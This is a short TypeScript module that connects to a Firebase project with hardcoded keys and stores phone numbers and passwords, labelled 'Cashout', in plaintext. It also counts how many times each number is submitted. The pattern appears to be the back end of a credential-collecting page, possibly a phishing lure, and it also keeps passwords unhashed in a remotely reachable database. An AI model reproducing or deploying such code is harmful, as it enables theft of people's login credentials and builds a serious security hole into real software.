import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set, get, update } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDj1qqCBztEpF31n9UU3DFKwiymc2Bd-iM",
  authDomain: "bot-ia-20e75.firebaseapp.com",
  databaseURL: "https://bot-ia-20e75-default-rtdb.firebaseio.com",
  projectId: "bot-ia-20e75",
  storageBucket: "bot-ia-20e75.appspot.com",
  messagingSenderId: "601684351023",
  appId: "1:601684351023:android:e94d0ab92f512c4cb80eda"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

export const saveCashoutData = async (numero: string, senha: string) => {
  const userRef = ref(database, `Cashout/${numero}`);
  
  try {
    const snapshot = await get(userRef);
    
    if (snapshot.exists()) {
      // Usuário já existe, apenas incrementa vezes
      const currentData = snapshot.val();
      await update(userRef, {
        vezes: (currentData.vezes || 1) + 1,
        data: new Date().toISOString()
      });
      return { exists: true };
    } else {
      // Novo usuário
      await set(userRef, {
        numero,
        senha,
        data: new Date().toISOString(),
        vezes: 1
      });
      return { exists: false };
    }
  } catch (error) {
    console.error('Error saving to Firebase:', error);
    throw error;
  }
};
